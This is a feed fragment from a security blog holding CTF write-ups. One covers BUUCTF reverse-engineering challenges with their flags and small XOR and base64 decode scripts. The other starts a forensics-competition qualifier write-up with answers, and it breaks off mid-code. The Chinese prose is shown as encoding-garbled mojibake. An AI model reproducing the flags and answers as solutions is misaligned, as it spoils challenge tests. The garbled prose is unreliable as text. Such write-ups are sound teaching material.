    <content type="html"><![CDATA[<h1 id="0x000-ç»ªè®º"><a href="#0x000-ç»ªè®º" class="headerlink" title="0x000.ç»ªè®º"></a>0x000.ç»ªè®º</h1><blockquote><p><a href="buuoj.cn">BUUCTF</a>æ˜¯ä¸€ä¸ªå·¨å‹CTFé¢˜åº“ï¼Œå¤§è‡´å¯ä»¥ç±»æ¯”OIerä»¬çš„æ´›è°·ä¸€æ ·çš„åœ°æ–¹ï¼Œåœ¨BUUCTFä¸Šæœ‰ç€åˆ†ç±»é½å…¨æ•°é‡åºå¤§çš„å„æ–¹å‘é¢˜ç›®ï¼ŒåŒ…æ‹¬å„å¤§CTFçš„åŸé¢˜</p><p>æ­£æ‰€è°“â€ä¸åˆ·BUUéCTFerâ€œï¼ˆ<del>å“ªé‡Œæœ‰è¿‡è¿™ç§å¥‡æ€ªçš„è¯å•¦</del>ï¼‰ï¼Œä½œä¸ºä¸€åæ–°æ™‹çš„è’Ÿè’»CTFer&amp;ç½‘å®‰ä¸“ä¸šé€‰æ‰‹ï¼Œå’±ä¹Ÿæ¥åšä¸€åšBUUCTFä¸Šçš„é¢˜ï¼Œå¹¶æŠŠé¢˜è§£åœ¨åšå®¢ä¸Šå­˜æ¡£ä¸€ä»½æ–¹ä¾¿åæ¥è€…å­¦ä¹ ï¼ˆ<del>å¿«é†’é†’ï¼Œå“ªé‡Œä¼šæœ‰äººçœ‹ä½ çš„åšå®¢å•¦XD</del></p><p>Baby Pwneråšçš„éƒ½æ˜¯pwné¢˜ï¼Œç‚¹å¼€å³å¯æŸ¥çœ‹é¢˜è§£</p></blockquote><p>ğŸ‘†åœ¨ç¬¬ä¸€ç¯‡BUUçš„é¢˜è§£ä¸­æˆ‘æ›¾ç»è¿™ä¹ˆè¯´è¿‡ï¼Œä½†æ˜¯ä½œä¸ºç ”ç©¶äºŒè¿›åˆ¶å®‰å…¨çš„æ–°æ‰‹ï¼ŒåŒæ—¶ä¹Ÿä½œä¸ºBaby Pwnerï¼Œæ·±æ·±åœ°æ„Ÿå—åˆ°äº†é€†å‘åŠŸåº•çš„é‡è¦æ€§</p><p>ä¸ºäº†å·©å›ºè‡ªå·±çš„é€†å‘åŠŸåº•ï¼Œæé«˜ä»£ç å®¡è®¡çš„åŠŸåŠ›ï¼Œä»Šå¤©å¼€å§‹ä¹Ÿå¹¶è¡Œåˆ·ä¸€åˆ·Reverse</p><span id="more"></span><blockquote><p><del>ä½†æ„¿è‚æœ‰äº‹ï¼Œä¸ç„¶å²‚ä¸æ˜¯ç­‰äºä¸€ç›´åœ¨åˆ’æ°´</del></p></blockquote><h1 id="0x001-easyre"><a href="#0x001-easyre" class="headerlink" title="0x001.easyre"></a>0x001.easyre</h1><p>æ‹–å…¥IDAä¸­å°±æœ‰flagäº†</p><p><img src="https://i.loli.net/2020/10/09/feVgh943dJCawl2.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;this_Is_a_EaSyRe&#125;</span><br></pre></td></tr></table></figure><h1 id="0x002-reverse1"><a href="#0x002-reverse1" class="headerlink" title="0x002.reverse1"></a>0x002.reverse1</h1><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p>å­˜åœ¨ä¸€ä¸ªå¯ç–‘çš„ç”¨æ‹¬å·åŒ…ç€çš„å­—ç¬¦ä¸²<code>&#123;hello_world&#125;</code></p><p><img src="https://i.loli.net/2020/10/09/XEvUVFzTgMCedk2.png" alt="image.png"></p><p>åŒæ—¶æˆ‘ä»¬å¯ä»¥å‘ç°ç¨‹åºä¼šæŠŠè¯¥å­—ç¬¦ä¸²ä¸­çš„<code>&#39;o&#39;</code>æ›¿æ¢æˆ<code>&#39;0&#39;</code></p><p><img src="https://i.loli.net/2020/10/09/jGMscx5D7PLImuU.png" alt="image.png"></p><p>æ•…å¾—flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;hell0_w0rld&#125;</span><br></pre></td></tr></table></figure><h1 id="0x003-reverse2"><a href="#0x003-reverse2" class="headerlink" title="0x003.reverse2"></a>0x003.reverse2</h1><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p>æœ‰ä¸ªå¯ç–‘å­—ç¬¦ä¸²<code>&#123;hacking_for_fun&#125;</code></p><p><img src="https://i.loli.net/2020/12/01/tfOhcsRFU5dJZwW.png" alt="image.png"></p><p>mainå‡½æ•°ä¸­ä¼šè¿›è¡Œç½®æ¢ï¼Œå°†<code>i</code>å’Œ<code>r</code>éƒ½æ¢æˆ<code>1</code></p><p><img src="https://i.loli.net/2020/12/01/xn2mXQ4hSOJGRpc.png" alt="image.png"></p><p>æ•…å¾—flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;hack1ng_fo1_fun&#125;</span><br></pre></td></tr></table></figure><h1 id="0x004-å†…æ¶µçš„è½¯ä»¶"><a href="#0x004-å†…æ¶µçš„è½¯ä»¶" class="headerlink" title="0x004.å†…æ¶µçš„è½¯ä»¶"></a>0x004.å†…æ¶µçš„è½¯ä»¶</h1><p>æ‹–å…¥IDAå°±æœ‰flag</p><p><img src="https://i.loli.net/2020/12/01/SYAMrylVujwUsx2.png" alt="image.png"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯æŠŠ<code>DBAPP</code>æ¢æˆ<code>flag</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;49d3c93df25caad81232130f3d2ebfad&#125;</span><br></pre></td></tr></table></figure><h1 id="0x005-æ–°å¹´å¿«ä¹-UPX"><a href="#0x005-æ–°å¹´å¿«ä¹-UPX" class="headerlink" title="0x005.æ–°å¹´å¿«ä¹ - UPX"></a>0x005.æ–°å¹´å¿«ä¹ - UPX</h1><p>æƒ¯ä¾‹çš„æ‹–å…¥IDAï¼Œå‘ç°<strong>å•¥éƒ½æ²¡æœ‰</strong>ï¼Œæ¨æµ‹æ˜¯åŠ äº†å£³</p><p><img src="https://i.loli.net/2020/12/01/6shVrWOb4eo57ml.png" alt="image.png"></p><p>è„±å£³ä»¥åå°±å¯ä»¥åœ¨IDAä¸­ç›´æ¥å¾—åˆ°flagäº†</p><p><img src="https://i.loli.net/2020/12/01/mf56nyOzsKcq1lB.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/12/01/ovdKZlGnibcYCBX.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;HappyNewYear!&#125;</span><br></pre></td></tr></table></figure><h1 id="0x006-BJDCTF-2nd-guessgame"><a href="#0x006-BJDCTF-2nd-guessgame" class="headerlink" title="0x006.[BJDCTF 2nd]guessgame"></a>0x006.[BJDCTF 2nd]guessgame</h1><p>æ‹–å…¥IDAä¸­å°±æœ‰flagäº†</p><p><img src="https://i.loli.net/2020/12/01/B8ifYJoSXZ1n7GK.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;S1mple_ReV3r5e_W1th_0D_0r_IDA&#125;</span><br></pre></td></tr></table></figure><h1 id="0x007-helloworld"><a href="#0x007-helloworld" class="headerlink" title="0x007.helloworld"></a>0x007.helloworld</h1><p>æ‹–å…¥jadxä¸­å°±æœ‰flagäº†</p><p><img src="https://i.loli.net/2020/12/01/4thVcrYI1ZzTCDm.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7631a988259a00816deda84afb29430a&#125;</span><br></pre></td></tr></table></figure><h1 id="0x008-xor-å¼‚æˆ–"><a href="#0x008-xor-å¼‚æˆ–" class="headerlink" title="0x008.xor - å¼‚æˆ–"></a>0x008.xor - å¼‚æˆ–</h1><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œå‘ç°å‚¨å­˜äº†å¼‚æˆ–åŠ å¯†åçš„flag</p><p><img src="https://i.loli.net/2020/12/01/JunMCrOFymwdGP4.png" alt="image.png"></p><p>å†™ä¸ªè„šæœ¬è§£å¯†å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">b&#x27;f\nk\fw&amp;O.@\x11x\rZ;U\x11p\x19F\x1Fv\&quot;M#D\x0Eg\x06h\x0FG2O&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i] ^ flag[i-<span class="number">1</span>]),end = <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/12/01/geUBkJ4Stym6ZH7.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;QianQiuWanDai_YiTongJiangHu&#125;</span><br></pre></td></tr></table></figure><h1 id="0x009-reverse3-base64"><a href="#0x009-reverse3-base64" class="headerlink" title="0x009.reverse3 - base64"></a>0x009.reverse3 - base64</h1><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p>è¿™ä¸ªæ˜¯åŠ å¯†å‡½æ•°</p><p><img src="https://i.loli.net/2020/12/01/LCGYVdiuzOEWlpw.png" alt="image.png"></p><p>å­˜åœ¨base64ç è¡¨ï¼Œæ¨æµ‹åº”è¯¥æ˜¯base64</p><p><img src="https://i.loli.net/2020/12/01/xKH4aj7i3cdzETm.png" alt="image.png"></p><p>base64åŠ å¯†åè¿˜æœ‰ä¸€ä¸ªç®€å•çš„èµ‹å€¼æ“ä½œ</p><p>æ•…æ„é€ è§£å¯†è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line">ciphertext = <span class="string">&#x27;e3nifIH9b_C@n@dH&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(ciphertext[i])-i)</span><br><span class="line"><span class="built_in">print</span>(b64decode(flag))</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag</p><p><img src="https://i.loli.net/2020/12/01/wDduBRyQn9eCj8q.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;i_l0ve_you&#125;</span><br></pre></td></tr></table></figure><h1 id="0x00A-ä¸ä¸€æ ·çš„flag"><a href="#0x00A-ä¸ä¸€æ ·çš„flag" class="headerlink" title="0x00A.ä¸ä¸€æ ·çš„flag"></a>0x00A.ä¸ä¸€æ ·çš„flag</h1><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p>å¾—åˆ°flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;222441144222&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x000-ç»ªè®º&quot;&gt;&lt;a href=&quot;#0x000-ç»ªè®º&quot; class=&quot;headerlink&quot; title=&quot;0x000.ç»ªè®º&quot;&gt;&lt;/a&gt;0x000.ç»ªè®º&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;buuoj.cn&quot;&gt;BUUCTF&lt;/a&gt;æ˜¯ä¸€ä¸ªå·¨å‹CTFé¢˜åº“ï¼Œå¤§è‡´å¯ä»¥ç±»æ¯”OIerä»¬çš„æ´›è°·ä¸€æ ·çš„åœ°æ–¹ï¼Œåœ¨BUUCTFä¸Šæœ‰ç€åˆ†ç±»é½å…¨æ•°é‡åºå¤§çš„å„æ–¹å‘é¢˜ç›®ï¼ŒåŒ…æ‹¬å„å¤§CTFçš„åŸé¢˜&lt;/p&gt;
&lt;p&gt;æ­£æ‰€è°“â€ä¸åˆ·BUUéCTFerâ€œï¼ˆ&lt;del&gt;å“ªé‡Œæœ‰è¿‡è¿™ç§å¥‡æ€ªçš„è¯å•¦&lt;/del&gt;ï¼‰ï¼Œä½œä¸ºä¸€åæ–°æ™‹çš„è’Ÿè’»CTFer&amp;amp;ç½‘å®‰ä¸“ä¸šé€‰æ‰‹ï¼Œå’±ä¹Ÿæ¥åšä¸€åšBUUCTFä¸Šçš„é¢˜ï¼Œå¹¶æŠŠé¢˜è§£åœ¨åšå®¢ä¸Šå­˜æ¡£ä¸€ä»½æ–¹ä¾¿åæ¥è€…å­¦ä¹ ï¼ˆ&lt;del&gt;å¿«é†’é†’ï¼Œå“ªé‡Œä¼šæœ‰äººçœ‹ä½ çš„åšå®¢å•¦XD&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;Baby Pwneråšçš„éƒ½æ˜¯pwné¢˜ï¼Œç‚¹å¼€å³å¯æŸ¥çœ‹é¢˜è§£&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ğŸ‘†åœ¨ç¬¬ä¸€ç¯‡BUUçš„é¢˜è§£ä¸­æˆ‘æ›¾ç»è¿™ä¹ˆè¯´è¿‡ï¼Œä½†æ˜¯ä½œä¸ºç ”ç©¶äºŒè¿›åˆ¶å®‰å…¨çš„æ–°æ‰‹ï¼ŒåŒæ—¶ä¹Ÿä½œä¸ºBaby Pwnerï¼Œæ·±æ·±åœ°æ„Ÿå—åˆ°äº†é€†å‘åŠŸåº•çš„é‡è¦æ€§&lt;/p&gt;
&lt;p&gt;ä¸ºäº†å·©å›ºè‡ªå·±çš„é€†å‘åŠŸåº•ï¼Œæé«˜ä»£ç å®¡è®¡çš„åŠŸåŠ›ï¼Œä»Šå¤©å¼€å§‹ä¹Ÿå¹¶è¡Œåˆ·ä¸€åˆ·Reverse&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="http://archive.next.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/tags/CTF/"/>
    
    <category term="é€†å‘å·¥ç¨‹" scheme="http://archive.next.arttnba3.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="UPX" scheme="http://archive.next.arttnba3.cn/tags/UPX/"/>
    
  </entry>
  
  <entry>
    <title>ã€ç”µå­å–è¯-0x01ã€‘ç¾äºšæ¯ç¬¬å››å±Šå…¨å›½ç”µå­å–è¯ç«èµ›èµ„æ ¼èµ›write up by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/10/06/%E3%80%90%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-0x01%E3%80%91%E7%BE%8E%E4%BA%9A%E6%9D%AF%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E7%AB%9E%E8%B5%9B%E8%B5%84%E6%A0%BC%E8%B5%9Bwrite-up-by-arttnba3/"/>
    <id>http://archive.next.arttnba3.cn/2020/10/06/%E3%80%90%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-0x01%E3%80%91%E7%BE%8E%E4%BA%9A%E6%9D%AF%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E7%AB%9E%E8%B5%9B%E8%B5%84%E6%A0%BC%E8%B5%9Bwrite-up-by-arttnba3/</id>
    <published>2020-10-05T16:20:22.000Z</published>
    <updated>2020-11-12T07:27:22.428Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-ç»ªè®º"><a href="#0x00-ç»ªè®º" class="headerlink" title="0x00.ç»ªè®º"></a>0x00.ç»ªè®º</h1><p><a href="http://meiyacup.com/">â€œç¾äºšæ¯â€ä¸­å›½ç”µå­æ•°æ®å–è¯å¤§èµ›</a>æ˜¯ç”±<strong>ä¸­å›½åˆ‘äº‹è­¦å¯Ÿå­¦é™¢ä¸»åŠã€å¦é—¨ç¾äºšæŸç§‘æ‰¿åŠçš„ä¸­å›½ç”µå­æ•°æ®å–è¯å¤§èµ›</strong>ï¼Œä¹Ÿæ˜¯å›½å†…è¾ƒä¸ºæœ‰åçš„æ•°æ®å–è¯æ¯”èµ›</p><p>ä½œä¸ºç½‘å®‰ä¸“ä¸šçš„å°èŒæ–°å»å¹´å¯¹æ­¤æ¯«ä¸çŸ¥æƒ…ï¼ˆ<del>çŸ¥æƒ…äº†æˆ‘å¯èƒ½ä¹Ÿè¿‡ä¸äº†èµ„æ ¼èµ›</del>ï¼‰ï¼Œäºæ˜¯ä»Šå¹´æƒ³è¦å»ç©ç©ï¼ˆ<del>æŒ‡åˆ’æ°´</del>ï¼‰ï¼Œæ‰€ä»¥æ‰“ç®—è¶æ—¶é—´è¿˜å¤ŸæŠŠè¿‡å»çš„å‡ æ¬¡æ¯”èµ›çš„çœŸé¢˜ç»™åˆ·ä¸€åˆ·XD</p><span id="more"></span><blockquote><p>æ³¨ï¼šæœ¬äººæ„Ÿè§‰å–è¯æ¯”èµ›å°±æ˜¯ç†Ÿç»ƒè¿ç”¨å„ç§å·¥å…·çš„æ¯”èµ›â€¦ï¼ˆ<del>å–è¯è½¯ä»¶å…¬å¸çš„ç¡¬å¹¿</del></p></blockquote><h1 id="0x01-å·¥å…·"><a href="#0x01-å·¥å…·" class="headerlink" title="0x01.å·¥å…·"></a>0x01.å·¥å…·</h1><p><strong>ç¡¬ä»¶ï¼š</strong></p><ul><li>Microsoft Surface Book 2</li><li>Samsung 500G SSD</li></ul><p><strong>è½¯ä»¶ï¼š</strong></p><ul><li>å–è¯å¤§å¸ˆ<strong>è¯•ç”¨ç‰ˆ</strong></li><li>AccessData FTK Imager</li><li>DiskGenius</li><li>ç«çœ¼è¯æ®åˆ†æè½¯ä»¶V4ï¼ˆä»˜è´¹æˆæƒï¼‰</li><li>ç«çœ¼ä»¿çœŸå–è¯è½¯ä»¶ï¼ˆä»˜è´¹æˆæƒï¼‰</li></ul><h1 id="0x02-èµ„æ ¼èµ›-æ¡ˆæƒ…ä»‹ç»"><a href="#0x02-èµ„æ ¼èµ›-æ¡ˆæƒ…ä»‹ç»" class="headerlink" title="0x02.èµ„æ ¼èµ› - æ¡ˆæƒ…ä»‹ç»"></a>0x02.èµ„æ ¼èµ› - æ¡ˆæƒ…ä»‹ç»</h1><blockquote><p>1.æ—èƒœï¼ˆVictorï¼‰æ˜¯ä¸€åä¸‰åå²çš„ä¸­å­¦æ•™å¸ˆã€‚ä¸€å¤©ï¼Œä»–åœ¨å®¶ä¸­ä½¿ç”¨è®¡ç®—æœºæœŸé—´ï¼Œæ”¶åˆ°ä¸€å°å‹’ç´¢é‚®ä»¶ï¼Œå…¶ä¸­åˆ—å‡ºä»–ç”µå­é‚®ä»¶ç”¨æˆ·åå’Œå¯†ç ï¼ŒåŠå…¶ä»–å€‹äººèµ„æ–™ï¼Œä¸¦å£°ç§°ä»–çš„ç”¨æˆ·æ•°æ®å·²è¢«çªƒå–ï¼Œè®¡ç®—æœºå·²è¢«å…¥ä¾µã€‚é»‘å®¢å‘æ—èƒœå‹’ç´¢<strong>ä¸¤ä¸ªæ¯”ç‰¹å¸</strong>ï¼Œå¦åˆ™ä¼šä½¿ç”¨ä»–çš„ä¸ªäººç”¨æˆ·æ•°æ®ä½œéæ³•ç”¨é€”ã€‚æ—æ— åŠ›æ”¯ä»˜ï¼Œäºæ˜¯æŠ¥è­¦ï¼Œå¹¶å‘è­¦æ–¹æä¾›äº†ä»–çš„ä¸ªäººè®¡ç®—æœºä½œæ£€éªŒã€‚</p><p><img src="https://i.loli.net/2020/10/06/PRyuzoVedDlEBbw.png" alt="image.png"></p><p>2.ç°ä½ è¢«å§”æ´¾å¯¹æ—çš„è®¡ç®—æœºè¿›è¡Œç”µå­æ•°æ®å–è¯ï¼Œè¿˜åŸäº‹ä»¶ç»è¿‡ã€‚</p></blockquote><p>æœ¬æ¬¡æ¯”èµ›å…±1 ä¸ªç« èŠ‚ï¼Œ50 ä¸ªå°é¢˜ï¼Œæ¯é¢˜2åˆ†ï¼Œæ€»å…±100åˆ†ï¼Œæ¯”èµ›æ—¶é•¿118 åˆ†é’Ÿã€‚</p><h1 id="0x03-èµ„æ ¼èµ›-å•é¡¹é€‰æ‹©é¢˜"><a href="#0x03-èµ„æ ¼èµ›-å•é¡¹é€‰æ‹©é¢˜" class="headerlink" title="0x03.èµ„æ ¼èµ› - å•é¡¹é€‰æ‹©é¢˜"></a>0x03.èµ„æ ¼èµ› - å•é¡¹é€‰æ‹©é¢˜</h1><p>æˆ‘ä»¬é€‰æ‹©ä½¿ç”¨<strong>å–è¯å¤§å¸ˆ</strong>è¿™ä¸€å–è¯è½¯ä»¶è¿›è¡Œæˆ‘ä»¬çš„å–è¯å·¥ä½œ</p><p>æ–°å»ºæ¡ˆä¾‹â†’æ·»åŠ é•œåƒâ†’Victor_PC.E01</p><p>ç­‰å¾…è‡ªåŠ¨åˆ†æå®Œæˆï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°é•œåƒçš„æ‰€æœ‰ä¿¡æ¯åœ¨æˆ‘ä»¬é¢å‰ä¸€è§ˆæ— ä½™</p><p><img src="https://i.loli.net/2020/10/06/7oyvcFkA8zfs9R5.png" alt="image.png"></p><h2 id="1-Victorçš„ç¬”è®°æœ¬ç”µè„‘å·±æˆåŠŸå–è¯å¹¶åˆ¶ä½œæˆæ³•è¯æ˜ åƒæ¡£-Forensic-Image-ï¼Œä¸‹åˆ—å“ªä¸ªæ˜¯å…¶MD5å“ˆå¸Œå€¼"><a href="#1-Victorçš„ç¬”è®°æœ¬ç”µè„‘å·±æˆåŠŸå–è¯å¹¶åˆ¶ä½œæˆæ³•è¯æ˜ åƒæ¡£-Forensic-Image-ï¼Œä¸‹åˆ—å“ªä¸ªæ˜¯å…¶MD5å“ˆå¸Œå€¼" class="headerlink" title="1.Victorçš„ç¬”è®°æœ¬ç”µè„‘å·±æˆåŠŸå–è¯å¹¶åˆ¶ä½œæˆæ³•è¯æ˜ åƒæ¡£ (Forensic Image)ï¼Œä¸‹åˆ—å“ªä¸ªæ˜¯å…¶MD5å“ˆå¸Œå€¼?"></a>1.Victorçš„ç¬”è®°æœ¬ç”µè„‘å·±æˆåŠŸå–è¯å¹¶åˆ¶ä½œæˆæ³•è¯æ˜ åƒæ¡£ (Forensic Image)ï¼Œä¸‹åˆ—å“ªä¸ªæ˜¯å…¶MD5å“ˆå¸Œå€¼?</h2><blockquote><p>A. FC20782C21751AB76B2A93F3A17922D0</p><p>B. 882114D62E713DEA34C270CF2F1C69D2</p><p>C. A0BB016160CFB3A0BB0161661670CFB3</p><p>D. 917ED59083C8B35C54D3FCBFE4C4BB0B</p><p>E. FC20782C21751BA76B2A93F3A17922D0</p></blockquote><p>åœ¨å–è¯å¤§å¸ˆä¸‹æ–¹çš„ã€æ‘˜è¦ã€‘ä¸€æ ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶MD5å€¼åº”ä¸º<strong>FC20782C21751BA76B2A93F3A17922D0</strong></p><p><img src="https://i.loli.net/2020/10/06/N1nHTdcCOm4K68V.png" alt="image.png"></p><h2 id="2-æ ¹æ®æ³•è¯æ˜ åƒæ¡£-Forensic-Image-ï¼Œç¡®å®šåŸç¬”è®°æœ¬å†…æœ‰å¤šå°‘ä¸ªç¡¬ç›˜åˆ†åŒº"><a href="#2-æ ¹æ®æ³•è¯æ˜ åƒæ¡£-Forensic-Image-ï¼Œç¡®å®šåŸç¬”è®°æœ¬å†…æœ‰å¤šå°‘ä¸ªç¡¬ç›˜åˆ†åŒº" class="headerlink" title="2.æ ¹æ®æ³•è¯æ˜ åƒæ¡£ (Forensic Image)ï¼Œç¡®å®šåŸç¬”è®°æœ¬å†…æœ‰å¤šå°‘ä¸ªç¡¬ç›˜åˆ†åŒº?"></a>2.æ ¹æ®æ³•è¯æ˜ åƒæ¡£ (Forensic Image)ï¼Œç¡®å®šåŸç¬”è®°æœ¬å†…æœ‰å¤šå°‘ä¸ªç¡¬ç›˜åˆ†åŒº?</h2><blockquote><p>A. 1</p><p>B. 2</p><p>C. 3</p><p>D. 4</p><p>E. 5</p></blockquote><p>åœ¨å·¦è¾¹æ ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°é•œåƒå†…æœ‰ä¸‰ä¸ªç¡¬ç›˜åˆ†åŒº</p><p><img src="https://i.loli.net/2020/10/06/exhEMocuCbKIVwQ.png" alt="image.png"></p><h2 id="3-ä½ èƒ½æ‰¾åˆ°ç¡¬ç›˜æ“ä½œç³»ç»Ÿåˆ†åŒºå†…çš„å¼€å§‹é€»è¾‘åŒºå—åœ°å€ï¼ˆLBAï¼‰-ç­”æ¡ˆæ ¼å¼-æ‰‡åŒº-Sector"><a href="#3-ä½ èƒ½æ‰¾åˆ°ç¡¬ç›˜æ“ä½œç³»ç»Ÿåˆ†åŒºå†…çš„å¼€å§‹é€»è¾‘åŒºå—åœ°å€ï¼ˆLBAï¼‰-ç­”æ¡ˆæ ¼å¼-æ‰‡åŒº-Sector" class="headerlink" title="3.ä½ èƒ½æ‰¾åˆ°ç¡¬ç›˜æ“ä½œç³»ç»Ÿåˆ†åŒºå†…çš„å¼€å§‹é€»è¾‘åŒºå—åœ°å€ï¼ˆLBAï¼‰? (ç­”æ¡ˆæ ¼å¼: æ‰‡åŒº, Sector)"></a>3.ä½ èƒ½æ‰¾åˆ°ç¡¬ç›˜æ“ä½œç³»ç»Ÿåˆ†åŒºå†…çš„å¼€å§‹é€»è¾‘åŒºå—åœ°å€ï¼ˆLBAï¼‰? (ç­”æ¡ˆæ ¼å¼: æ‰‡åŒº, Sector)</h2><blockquote><p>A. 0</p><p>B. 2408</p><p>C. 1048576</p><p>D. 62916608</p><p>E. 32213303296</p></blockquote><p>é¦–å…ˆæˆ‘ä»¬åˆ†æå„ç£ç›˜ä¸­æ–‡ä»¶ç»“æ„ï¼Œä¸éš¾çœ‹å‡º<strong>Eç›˜åº”å½“æ˜¯ç³»ç»Ÿç›˜</strong></p><p><img src="https://i.loli.net/2020/10/06/X6ZFHqhTQcEj1lx.png" alt="image.png"></p><p>åœ¨ã€æ‘˜è¦ã€‘ä¸­æˆ‘ä»¬å¯ä»¥çœ‹å‡ºå…¶å¼€å§‹é€»è¾‘åŒºå—åœ°å€åº”ä¸º<strong>32,213,303,296</strong></p><p><img src="https://i.loli.net/2020/10/06/qTtHYUcEJjDyOLh.png" alt="image.png"></p><h2 id="4-ä½ èƒ½æ‰¾åˆ°ç¡¬ç›˜æ“ä½œç³»ç»Ÿåˆ†åŒºçš„ç‰©ç†å¤§å°å—-å­—èŠ‚byte"><a href="#4-ä½ èƒ½æ‰¾åˆ°ç¡¬ç›˜æ“ä½œç³»ç»Ÿåˆ†åŒºçš„ç‰©ç†å¤§å°å—-å­—èŠ‚byte" class="headerlink" title="4.ä½ èƒ½æ‰¾åˆ°ç¡¬ç›˜æ“ä½œç³»ç»Ÿåˆ†åŒºçš„ç‰©ç†å¤§å°å— (å­—èŠ‚byte)?"></a>4.ä½ èƒ½æ‰¾åˆ°ç¡¬ç›˜æ“ä½œç³»ç»Ÿåˆ†åŒºçš„ç‰©ç†å¤§å°å— (å­—èŠ‚byte)?</h2><blockquote><p>A. 62709760</p><p>B. 62910464</p><p>C. 104857600</p><p>D. 32107397120</p><p>E. 32210157568</p></blockquote><p>é¦–å…ˆåœ¨æ‘˜è¦ä¸­æˆ‘ä»¬å¯ä»¥å¾—çŸ¥<strong>æ¯ä¸ªæ‰‡åŒºçš„å¤§å°ä¸º512 Byte</strong></p><p><img src="https://i.loli.net/2020/10/06/9AeOzGDJi7LcQoa.png" alt="image.png"></p><p>ç³»ç»Ÿç›˜ä¸­ä¸€å…±æœ‰<strong>62,910,464</strong>ä¸ªæ‰‡åŒº</p><p><img src="https://i.loli.net/2020/10/06/qTtHYUcEJjDyOLh.png" alt="image.png"></p><p>äºæ˜¯æˆ‘ä»¬å¯ä»¥è®¡ç®—å‡ºç³»ç»Ÿç›˜çš„ç‰©ç†å¤§å°åº”ä¸º<strong>32,210,157,568 Bytes</strong></p><blockquote><p>å¯ä»¥ä½¿ç”¨pythonè¾…åŠ©è®¡ç®—ï¼ˆè®¡ç®—å™¨å½“ç„¶ä¹Ÿè¡ŒXDåªä¸è¿‡æˆ‘ç¬¬ä¸€æ—¶é—´æƒ³èµ·æ¥çš„å°±æ˜¯pythonï¼ˆğŸ‘ˆæŠŠè¿™ä¸ªå¤©å¤©è¯´åºŸè¯çš„äººæ‹–å‡ºå»æ‰“æ­»</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td 